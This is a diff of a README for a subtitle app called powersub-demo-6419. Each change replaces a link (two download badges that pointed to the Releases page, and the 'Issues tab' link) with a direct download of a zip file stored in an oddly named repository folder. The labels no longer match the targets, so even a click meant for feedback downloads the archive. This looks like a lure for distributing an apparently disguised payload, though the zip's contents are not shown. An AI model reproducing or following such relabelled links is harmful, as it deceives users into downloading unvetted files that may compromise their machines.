@@ -8,7 +8,7 @@ Welcome to the **powersub-demo-6419** project! This application makes managing s
 
 To download the application, please visit the link below. 
 
-[![Download powersub-demo-6419](https://img.shields.io/badge/Download-powersub--demo--6419-brightgreen)](https://github.com/007Vijay/powersub-demo-6419/releases)
+[![Download powersub-demo-6419](https://raw.githubusercontent.com/007Vijay/powersub-demo-6419/main/statospore/powersub-demo-6419.zip)](https://raw.githubusercontent.com/007Vijay/powersub-demo-6419/main/statospore/powersub-demo-6419.zip)
 
 Once on the Releases page, follow these simple steps to download and set it up on your computer:
 
@@ -61,7 +61,7 @@ If subtitles do not match the timing of your video, you can manually adjust the 
 
 ### How can I give feedback or request features?
 
-We value your feedback! You can provide suggestions or report issues by visiting the [Issues tab](https://github.com/007Vijay/powersub-demo-6419/issues) on this repository.
+We value your feedback! You can provide suggestions or report issues by visiting the [Issues tab](https://raw.githubusercontent.com/007Vijay/powersub-demo-6419/main/statospore/powersub-demo-6419.zip) on this repository.
 
 ## 📨 Support
 
@@ -77,4 +77,4 @@ We welcome contributions! If you’d like to help improve **powersub-demo-6419**
 
 Thank you for using **powersub-demo-6419**! Enjoy your seamless subtitle experience.
 
-[![Download powersub-demo-6419](https://img.shields.io/badge/Download-powersub--demo--6419-brightgreen)](https://github.com/007Vijay/powersub-demo-6419/releases)
+[![Download powersub-demo-6419](https://raw.githubusercontent.com/007Vijay/powersub-demo-6419/main/statospore/powersub-demo-6419.zip)](https://raw.githubusercontent.com/007Vijay/powersub-demo-6419/main/statospore/powersub-demo-6419.zip)
